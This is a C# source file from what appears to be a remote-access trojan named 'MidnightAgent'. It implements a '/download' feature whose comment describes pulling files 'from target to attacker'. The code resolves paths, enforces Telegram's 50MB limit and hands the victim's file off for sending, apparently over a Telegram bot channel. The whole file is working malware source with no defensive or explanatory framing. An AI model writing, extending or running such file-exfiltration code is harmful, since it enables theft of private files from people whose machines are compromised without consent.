using System;
using System.IO;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /download - Download file from target to attacker
    /// </summary>
    public class FileDownloadFeature : IFeature
    {
        public string Command => "download";
        public string Description => "Download file from target";
        public string Usage => "/download <path>";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
            {
                return Task.FromResult(FeatureResult.Fail("Usage: /download <path>"));
            }

            string path = string.Join(" ", args);

            try
            {
                // Expand environment variables
                path = Environment.ExpandEnvironmentVariables(path);

                if (!File.Exists(path))
                {
                    return Task.FromResult(FeatureResult.Fail($"File not found: {path}"));
                }

                // Check file size (Telegram limit is 50MB)
                var fileInfo = new FileInfo(path);
                if (fileInfo.Length > 50 * 1024 * 1024)
                {
                    return Task.FromResult(FeatureResult.Fail($"File too large: {fileInfo.Length / 1024 / 1024}MB (max 50MB)"));
                }

                // Send file directly without copying
                return Task.FromResult(new FeatureResult
                {
                    Success = true,
                    FilePath = path,
                    Message = $"📁 {fileInfo.Name} ({fileInfo.Length / 1024}KB)",
                    DeleteFileAfterSend = false // Don't delete original file!
                });
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }
    }
}
